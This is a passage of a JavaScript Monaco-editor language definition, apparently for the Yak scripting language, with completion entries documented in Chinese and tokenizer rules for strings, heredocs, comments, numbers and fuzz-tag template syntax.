          'assert(b bool, reason ...any)  doc:assert 用于判断传入的布尔值是否为真，如果为假则崩溃并打印错误信息\n\n! 已弃用，可以使用 assert 语句代替\n\nExample:\n```\nassert(code == 200, "code != 200") // 如果code不等于200则会崩溃并打印错误信息\n// 其相当于 assert code == 200, "code != 200"\n```\n',
        insertText: "assert(${1:b /*type: bool*/}, ${2:reason...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "append(${1:a}, ${2:vals...})",
        documentation:
          "append(a any, vals ...any) (ret any)  doc:append 将元素追加到数组或切片中，并将结果返回\n\nExample:\n```\na = [1, 2, 3]\na = append(a, 4, 5, 6)\nprintln(a) // [1 2 3 4 5 6]\n```\n",
        insertText: "append(${1:a}, ${2:vals...})",
        insertTextRules: 4,
      },
    ].reduce((acc, cur) => {
      const match = /(^\w+)\(.*\)/.exec(cur.insertText);
      if (match?.length === 2) {
        acc.push(match[1].toString());
      }
      return acc;
    }, []),
    digits: /\d+(_+\d+)*/,
    symbols: /[=><!~?:&|+\-*\/\^%]+/,
    escapes: /\\(?:[abfnrtv\\"']|x[0-9A-Fa-f]{2}|u[0-9A-Fa-f]{4})/,

    docIdentifierName: /[a-zA-Z_\u0080-\ufffe][a-zA-Z0-9_\u0080-\ufffe]*/,
    inlineExpr: /\$\{[^}]*\}/,
    invalidInlineExpr: /\$\{[^}]*$/,
    tokenizer: {
      root: [
        // f-strings
        [/f"/, "string.quoted.double.js", "@fstring"],
        [/f'/, "string.quoted.single.js", "@fstring2"],
        [/f`/, "string", "@frawstring"],
        // x-strings
        [/x"/, "string.quoted.double.js", "@xstring"],
        [/x'/, "string.quoted.single.js", "@xstring2"],
        [/x`/, "string", "@xrawstring"],
        // doc-strings
        [
          /<<<\s*(['"]?)(@docIdentifierName)(\1)/,
          "string.heredoc.delimiter",
          "@heredoc.$2",
        ],
        // identifiers and keywords
        [/_(?!\w)/, "keyword.$0"],
        [
          /([a-zA-Z_]\w+)(\.)([a-zA-Z_]\w+)/,
          {
            cases: {
              "@libFuncNames": ["type.identifier", "delimiter", "libFunction"],
              "@default": "identifier",
            },
          },
        ],
        [
          /[a-zA-Z_]\w*/,
          {
            cases: {
              "@keywords": { token: "keyword.$0" },
              "@types": { token: "basic.type" },
              "@libnames": "type.identifier",
              "@globals": "globals",
              "@default": "identifier",
            },
          },
        ],

        // whitespace
        { include: "@whitespace" },

        // [[ attributes ]].
        [/\[\[.*\]\]/, "annotation"],

        // Preprocessor directive
        [/^\s*#\w+/, "keyword"],

        // delimiters and operators
        [/[{}()\[\]]/, "@brackets"],
        // [/[<>](?!@symbols)/, '@brackets'],
        [
          /@symbols/,
          {
            cases: {
              "@operators": "operator",
              "@default": "",
            },
          },
        ],

        // numbers
        [/\d*\d+[eE]([\-+]?\d+)?/, "number.float"],
        [/\d*\.\d+([eE][\-+]?\d+)?/, "number.float"],
        [/0[xX][0-9a-fA-F']*[0-9a-fA-F]/, "number.hex"],
        [/0[0-7']*[0-7]/, "number.octal"],
        [/0[bB][0-1']*[0-1]/, "number.binary"],
        [/\d[\d']*/, "number"],
        [/\d/, "number"],

        // delimiter: after number because of .\d floats
        [/[;,.]/, "delimiter"],

        // characters
        [/'[^\\']'/, "string"],
        [/(')(@escapes)(')/, ["string", "string.escape", "string"]],

        // strings
        [/"([^"\\]|\\.)*$/, "string.invalid"], // non-teminated string
        [/'([^'\\]|\\.)*$/, "string.invalid"], // non-teminated string
        [/"/, "string.quoted.double.js", "@string"],
        [/'/, "string.quoted.single.js", "@string2"],
        [/`/, "string", "@rawstring"],
        [/'/, "string.invalid"],
      ],

      fuzz_tag: [
        [/{{/, "fuzz.tag.inner", "@fuzz_tag_second"],
        [/}}/, "fuzz.tag.inner", "@pop"],
        [/[\w:]+}}/, "fuzz.tag.inner", "@pop"],
        [/[\w:]+\(/, "fuzz.tag.inner", "@fuzz_tag_param"],
      ],
      fuzz_tag_second: [
        [/{{/, "fuzz.tag.second", "@fuzz_tag"],
        [/}}/, "fuzz.tag.second", "@pop"],
        [/[\w:]+}}/, "fuzz.tag.second", "@pop"],
        [/[\w:]+\(/, "fuzz.tag.second", "@fuzz_tag_param_second"],
      ],
      fuzz_tag_param: [
        [/\(/, "fuzz.tag.inner", "@fuzz_tag_param"],
        [/\\\)/, "bold-keyword"],
        [/\)/, "fuzz.tag.inner", "@pop"],
        [/{{/, "fuzz.tag.second", "@fuzz_tag_second"],
        [/./, "bold-keyword"],
      ],
      fuzz_tag_param_second: [
        [/\\\)/, "bold-keyword"],
        [/\)/, "fuzz.tag.second", "@pop"],
        [/{{/, "fuzz.tag.inner", "@fuzz_tag"],
        [/./, "bold-keyword"],
      ],

      whitespace: [
        [/[ \t\r\n]+/, ""],
        [/\/\*\*(?!\/)/, "comment.doc", "@doccomment"],
        [/\/\*/, "comment", "@comment"],
        [/\/\/.*$/, "comment"],
        [/#.*$/, "comment"],
      ],

      comment: [
        [/[^\/*]+/, "comment"],
        // [/\/\*/, 'comment', '@push' ],    // nested comment not allowed :-(
        // [/\/\*/,    'comment.invalid' ],    // this breaks block comments in the shape of /* //*/
        [/\*\//, "comment", "@pop"],
        [/[\/*]/, "comment"],
        [/#/, "comment"],
      ],
      //Identical copy of comment above, except for the addition of .doc
      doccomment: [
        [/[^\/*]+/, "comment.doc"],
        // [/\/\*/, 'comment.doc', '@push' ],    // nested comment not allowed :-(
        [/\/\*/, "comment.doc.invalid"],
        [/\*\//, "comment.doc", "@pop"],
        [/[\/*]/, "comment.doc"],
      ],

      // disable fuzztag because of monaco editor bug
      xrawstring: [
        // [/{{/, "fuzz.tag.inner", "@fuzz_tag"],
        [/[^`]/, "string"],
        [/`/, "string", "@pop"],
      ],

      xstring: [
        // [/{{/, "fuzz.tag.inner", "@fuzz_tag"],
        [/@escapes/, "string.escape"],
        [/[^\\"]+/, "string"],
        [/\\./, "string.escape.invalid"],
        [/"/, "string", "@pop"],
      ],

      xstring2: [
        // [/{{/, "fuzz.tag.inner", "@fuzz_tag"],
        [/@escapes/, "string.escape"],
        [/[^\\']/, "string"],
        [/'/, "string", "@pop"],
      ],

      frawstring: [
        [/@inlineExpr/, "string.inline.expr"],
        [/@invalidInlineExpr/, "string.invalid"],
        [/[^`]/, "string"],
        [/`/, "string", "@pop"],
      ],

      fstring: [
        [/@escapes/, "string.escape"],
        [/@inlineExpr/, "string.inline.expr"],
        [/@invalidInlineExpr/, "string.invalid"],
        [/[^\\"]/, "string"],
        [/\\./, "string.escape.invalid"],
        [/"/, "string", "@pop"],
      ],

      fstring2: [
        [/@escapes/, "string.escape"],
        [/@inlineExpr/, "string.inline.expr"],
        [/@invalidInlineExpr/, "string.invalid"],
        [/[^\\']/, "string"],
        [/'/, "string", "@pop"],
      ],

      string: [
        [/@escapes/, "string.escape"],
        [/[^\\"]/, "string"],
        [/\\./, "string.invalid"],
        [/"/, "string", "@pop"],
      ],

      string2: [
        [/@escapes/, "string.escape"],
        [/[^\\']/, "string"],
        [/'/, "string", "@pop"],
      ],

      rawstring: [
        [/[^`]/, "string"],
        [/`/, "string", "@pop"],
      ],
      heredoc: [
        [
          /^\s*(@docIdentifierName)/,
          {
            cases: {
              "$1==$S2": { token: "string.heredoc.delimiter", next: "@pop" },
              "@default": "string",
            },
          },
        ],
        [/./, "string"],
      ],
    },
  });
}

